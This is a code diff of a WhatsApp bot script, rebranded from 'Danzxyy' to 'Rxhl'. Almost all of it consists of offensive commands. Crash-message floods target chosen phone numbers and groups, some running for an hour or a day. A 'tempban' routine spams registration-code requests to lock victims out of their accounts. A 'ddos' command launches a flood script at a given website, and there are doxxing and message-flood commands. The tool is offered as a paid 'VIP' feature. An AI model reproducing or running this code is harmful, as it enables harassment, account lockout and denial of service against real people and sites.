-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // ASUPAN MENU
 case 'asupanmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -2411,8 +1486,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -2430,44 +1503,10 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}paptt
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // CASE LAINNYA
 case 'bugpayment':
@@ -2531,7 +1570,7 @@ fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
 replyz(`Number ${yaki} Has Been Removed From Murbug!!!`)
 break
 
-case 'listowner':
+case 'listuser':
 if (!isCreator) return replyz(global.nocreator)
 teksooo = '*List User Vip*\n\n'
 for (let i of owner) {
@@ -2541,23 +1580,13 @@ teksooo += `\n*Total : ${owner.length}*`
 rxhl.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
 break
 
-case 'listmurbug':
-if (!isCreator) return replyz(global.nocreator)
-teksooo = '*List User Vip*\n\n'
-for (let i of murbug) {
-teksooo += `- ${i}\n`
-}
-teksooo += `\n*Total : ${murbug.length}*`
-rxhl.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": murbug } })
-break
-
 case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
 await loading()
  rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await rxhl.sendMessage(from, { audio: rxhlganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
 mediaUrl: 'https://wa.me/50663646464',
-title: `DANZXYY MODS`,
+title: `RXHL MODS`,
 sourceUrl: `https://wa.me/50663646464`, 
 thumbnail: rxhlimage
 }
@@ -2953,13 +1982,13 @@ image: rxhlimage,
 caption: `*Hallo ${pushname}*
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *INFO CREATOR AND BOT*
-Creator: Danzxyy666.v6
-Telegram: @𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+Creator: Rxhl Official
+Telegram: @rxhlvro
 Base: Rxhl
 Versi Bot: V6
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
-*SCRIPT DEVELOPED BY DANZXYY OFFICIAL*`
+*SCRIPT DEVELOPED BY RXHL OFFICIAL*`
 }
 rxhl.sendMessage(from, infobot)
 break
@@ -3269,7 +2298,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 20
 sendVariousMessages(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666 to ${Pe} Please pause for 3 minutes🐶🚮*`)
+replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
 break
 
 case 'bugcrashv2': 
@@ -3279,7 +2308,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 20
 sendVariousMessages(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666 to ${Pe} Please pause for 3 minutes🐶🚮*`)
+replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
 break
 
 case 'bugcrashv3': 
@@ -3288,7 +2317,7 @@ if (!isMurbug) return replyz(global.nocreator)
 jumlah = 20
 sendVariousMessages(from, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮. Please pause for 3 minutes*`)
+replyz(`*</> Successfully sent a bug. Please pause for 3 minutes*`)
 break
 
 case 'ytmp3': case 'youtubemp3': {
@@ -3387,7 +2416,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 20
 sendRepeatedMessages2(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮. to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
+replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
 break
 
 case 'bugsystemv2':
@@ -3397,7 +2426,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 20
 sendRepeatedMessages2(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮. to group ${Pe}. Please pause commenting for 3 minutes 🤗`)
+replyz(`*</> Successfully submitted bug to group ${Pe}. Please pause commenting for 3 minutes 🤗`)
 break
 
 case 'bugsystemv3':
@@ -3406,7 +2435,7 @@ if (!isMurbug) return replyz(global.nocreator)
 jumlah = 20
 sendRepeatedMessages2(from, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮.. Please pause commenting for 3 minutes 🤗`)
+replyz(`*</> Successfully submitted the bug. Please pause commenting for 3 minutes 🤗`)
 break
 
 case 'crash1jam':
@@ -3416,7 +2445,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 900
 sendVariousMessages(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮. to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
+replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
 break
 
 case 'crash1hari':
@@ -3426,7 +2455,7 @@ Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.
 jumlah = 21600
 sendVariousMessages(Pe, jumlah)
 await sleep(2000)
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮. to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
+replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
 break
 
 case 'bannedno':
@@ -3468,7 +2497,7 @@ for (let i = 0; i < amount; i++) {
 await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 await sleep(1400)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮. ${victim}`)
+replyz(`</> Successfully submitted bug number ${victim}`)
 }
 break
 
@@ -3483,7 +2512,7 @@ for (let i = 0; i < amount; i++) {
 await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 await sleep(1400)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮. ${victim}`)
+replyz(`</> Successfully submitted bug number ${victim}`)
 }
 break
 
@@ -3499,7 +2528,7 @@ for (let i = 0; i < amount; i++) {
 rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
 await sleep(1500)
 }
-replyz(`</> Done Send Bug By Danzxyy666 ${command} to number *${Pe}*`)
+replyz(`</> Success Sending ${command} to number ${Pe}`)
 }
 break
 
@@ -3515,7 +2544,7 @@ for (let i = 0; i < amount; i++) {
 rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
 await sleep(1500)
 }
-replyz(`</> Done Send Bug By Danzxyy666 ${command} to group ${Pe}`)
+replyz(`</> Success Sending ${command} to group ${Pe}`)
 }
 break
 
@@ -3531,7 +2560,7 @@ for (let i = 0; i < amount; i++) {
 rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `RxhlOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
 await sleep(1500)
 }
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮*`)
+replyz(`*</> Succes 🥰*`)
 }
 break
 
@@ -3547,7 +2576,7 @@ for (let i = 0; i < amount; i++) {
 rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `RxhlOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
 await sleep(1500)
 }
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮*`)
+replyz(`*</> Succes 🥰*`)
 }
 break
 
@@ -3580,7 +2609,7 @@ await sleep(500)
 sendListMessage(Pe)
 await sleep(500)
 }
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮.*`)
+replyz(`*</> Succes 🥰*`)
 break
 
 case 'tempban': {
@@ -3592,7 +2621,7 @@ let cCode = qtext.split("|")[0]
 let number = qtext.split("|")[1]
 let fullNo = cCode + number
 await replyz(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
-let { state } = await useMultiFileAuthState('tempban')
+let { state } = await useMultiFileAuthState('session')
 let spam = makeWASocket({
 auth: state,
 mobile: true,
@@ -3601,18 +2630,18 @@ logger: pino({ level: 'silent' })
 let dropNumber = async () => {
 try {
 let res = await spam.requestRegistrationCode({
-phoneNumber: '+' + fullNo,
+phoneNumber: `+${fullNo}`,
 phoneNumberCountryCode: cCode,
 phoneNumberNationalNumber: number,
 phoneNumberMobileCountryCode: 724,
 })
 if (res.reason === 'temporarily_unavailable') {
 console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
-await sleep(100)
+await sleep(1000)
 await dropNumber()
 }
 } catch (error) {
-// Wkwkkw
+console.error(error)
 }
 }
 numbers[fullNo] = { cCode, number };
@@ -3654,7 +2683,7 @@ body: ewe,
 footer: XeonOP
 })
 }
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮.*`)
+replyz(`*</> Succes 🥰*`)
 break
 
 case 'bugparamsgc':
@@ -3688,7 +2717,7 @@ body: ewe,
 footer: XeonOP
 })
 }
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮.*`)
+replyz(`*</> Succes 🥰*`)
 break
 
 case 'bugparamsin':
@@ -3715,7 +2744,7 @@ rxhl.sendButton(from,  hohe, m, {
 body: ewe,
 footer: `rxhl`
 })
-replyz(`*</> Done Send Bug By Danzxyy666🐶🚮.*`)
+replyz(`*</> Succes 🥰*`)
 break
 
 case "bughomepc":
@@ -3821,10 +2850,10 @@ sleep(500)
 iponcrash(Pe)
 sleep(500)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
-case 'ddosv1':
+case 'ddos':
 if (!isMurbug) return replyz(global.nocreator)
 if (!q.includes(' ')) return replyz(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                      const targetweb = q.substring(0, q.indexOf(' ') - 0)
@@ -3843,7 +2872,7 @@ rxhl.sendButton(from, [{
    body: moci,
    footer: ''
 })
-              exec(`node ./lib/ddos/ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
         if (error) {
           replyz(`Error: ${error.message}`);
           return;
@@ -3874,7 +2903,7 @@ sleep(500)
 iponcrash(Pe)
 sleep(500)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'iosfullv2':
@@ -3894,7 +2923,7 @@ sleep(500)
 sendBugIos(Pe)
 sleep(500)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'samsungcrash':
@@ -3918,7 +2947,7 @@ sendListMessage(Pe)
 sendLiveLocationMessage(Pe)
 sendSystemCrashMessage(Pe)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'slayer07':
@@ -3946,7 +2975,7 @@ sleep(500)
 penghitaman(Pe, force)
 rxhl.sendMessage(Pe, {image: slayer07, caption: `SLAYER 07`},{quoted: m})
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'darkness':
@@ -3974,7 +3003,7 @@ sleep(500)
 penghitaman(Pe, force)
 rxhl.sendMessage(Pe, {document: slayer07, caption: `Darkness 㐅` },{quoted: m})
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'virkon':
@@ -4002,7 +3031,7 @@ sleep(500)
 penghitaman(Pe, force)
 rxhl.sendMessage(Pe, {image: slayer07, caption: `Virkon WhatsApp ✅`},{quoted: m})
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'dox': { //by moraxs inc
@@ -4171,7 +3200,7 @@ ngeloc(Pe, force)
 ngeloc(Pe, force)
 sendSystemCrashMessage(Pe)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'samsung-brutal':
@@ -4193,7 +3222,7 @@ ngeloc(Pe, force)
 sendSystemCrashMessage(Pe)
 sleep(200)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'fatal-notif': case 'fatal-ui':
@@ -4233,7 +3262,7 @@ sleep(200)
 ngeloc(Pe, force)
 sleep(200)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'bug-brutal':
@@ -4254,7 +3283,7 @@ pirgam(Pe, bugquoteddvc)
 sendLiveLocationMessage(Pe)
 sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 case 'crash-all-dvc':
@@ -4282,7 +3311,7 @@ sleep(100)
 sendLiveLocationMessage(Pe)
 bakdok(Pe, force)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* Amount *${amount}*`)
+replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
 break
 
 
@@ -4338,7 +3367,7 @@ await sendExtendedTextMessage(Pe)
 rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'killwhatsapp':
@@ -4393,7 +3422,7 @@ await sendExtendedTextMessage(Pe)
 rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'auto-crash':
@@ -4448,7 +3477,7 @@ await sendExtendedTextMessage(Pe)
 rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'new-bunga':
@@ -4503,7 +3532,7 @@ await sendExtendedTextMessage(Pe)
 rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'kill-ripper':
@@ -4558,7 +3587,7 @@ await sendExtendedTextMessage(Pe)
 rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'external-crash1': case 'external-crash2': case 'external-crash3': case 'internal-crash1': case 'internal-crash2':
@@ -4580,7 +3609,7 @@ await penghitaman(Pe, force)
 await sendSystemCrashMessage(Pe)
 await sendBugIos(Pe)
 await sendExtendedTextMessage(Pe)
-rxhl.sendMessage(Pe, {text: `Anjay ${command} ✅`}, {quoted: force})
+rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
 await sleep(2000)
 await ngeloc(Pe, force)
 await pirgam(Pe, bugquoteddvc)
@@ -4595,7 +3624,7 @@ await penghitaman(Pe, force)
 await sendSystemCrashMessage(Pe)
 await sendBugIos(Pe)
 await sendExtendedTextMessage(Pe)
-rxhl.sendMessage(Pe, {text: `Anjay ${command} ✅`}, {quoted: force})
+rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
 await sleep(2000)
 await ngeloc(Pe, force)
 await pirgam(Pe, bugquoteddvc)
@@ -4610,10 +3639,10 @@ await penghitaman(Pe, force)
 await sendSystemCrashMessage(Pe)
 await sendBugIos(Pe)
 await sendExtendedTextMessage(Pe)
-rxhl.sendMessage(Pe, {text: `Anjay ${command} ✅`}, {quoted: force})
+rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
 await sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'onlyios-crash':
@@ -4637,7 +3666,7 @@ await sendBugIos(Pe)
 await sendBugIos(Pe)
 await sendBugIos(Pe)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
 
 case 'onlysamsung-crash':
@@ -4696,679 +3725,8 @@ await ngeloc(Pe, force)
 await sendSystemCrashMessage(Pe)
 sleep(2000)
 }
-replyz(`</> Done Send Bug By Danzxyy666🐶🚮 *${command}* to number *${Pe}*`)
+replyz(`</> Successfully submitted the bug *${command}*`)
 break
-
-case 'enc':
-if (!isCreator) return m.reply(global.nocreator)
-if (!q) return replyz(`Example ${prefix+command} const time = require('money')`)
-let meg = await obfus(q)
-replyz(`${meg.result}`)
-break
-
-case 'clear':
-if (!isMurbug) return replyz(global.nocreator)
-if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-rxhl.sendMessage(Pe, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
-replyz('done')
-break 
-
-case 'bugmenu':
-msg = generateWAMessageFromContent(from, {
-  viewOnceMessage: {
-    message: {
-      messageContextInfo: {
-        deviceListMetadata: {},
-        deviceListMetadataVersion: 2
-      },
-      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-body: proto.Message.InteractiveMessage.Body.create({
-            text: '*Silahkan pilih bug menu dibawah ini ✅*'
-          }),
-          footer: proto.Message.InteractiveMessage.Footer.create({
-            text: `RxhL-Official`
-          }),
-          header: proto.Message.InteractiveMessage.Header.create({
-            hasMediaAttachment: false
-          }),
-        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
-          cards: [
-{
-              body: proto.Message.InteractiveMessage.Body.fromObject({
-              }),
-              footer: proto.Message.InteractiveMessage.Footer.fromObject({
-              }),
-              header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: `Bug Menu Versi 1`,
-                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer }))
-              }),
-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                buttons: [
-{
-   name: "quick_reply",
-   buttonParamsJson: JSON.stringify({
-      display_text: "Open Bug Menu V1",
-      id: ".bugmenuv1"
-   }),
-}
-                  ]
-              })
-            },
-            {
-              body: proto.Message.InteractiveMessage.Body.fromObject({
-              }),
-              footer: proto.Message.InteractiveMessage.Footer.fromObject({
-              }),
-              header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: `Bug Menu Versi 2`,
-                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer }))
-              }),
-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                buttons: [
-{
-   name: "quick_reply",
-   buttonParamsJson: JSON.stringify({
-      display_text: "Open Bug Menu V2",
-      id: ".bugmenuv2"
-   }),
-}
-                  ]
-              })
-            },
-            {
-              body: proto.Message.InteractiveMessage.Body.fromObject({
-              }),
-              footer: proto.Message.InteractiveMessage.Footer.fromObject({
-              }),
-              header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: `Bug Menu Versi 3`,
-                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer }))
-              }),
-              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                buttons: [
-{
-   name: "quick_reply",
-   buttonParamsJson: JSON.stringify({
-      display_text: "Open Bug Menu V3",
-      id: ".bugmenuv3"
-   }),
-}
-                  ]
-              })
-            },
-            {
-              body: proto.Message.InteractiveMessage.Body.fromObject({
-              }),
-              footer: proto.Message.InteractiveMessage.Footer.fromObject({
-              }),
-              header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: `Bug Menu VIP`,
-                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer }))
-              }),
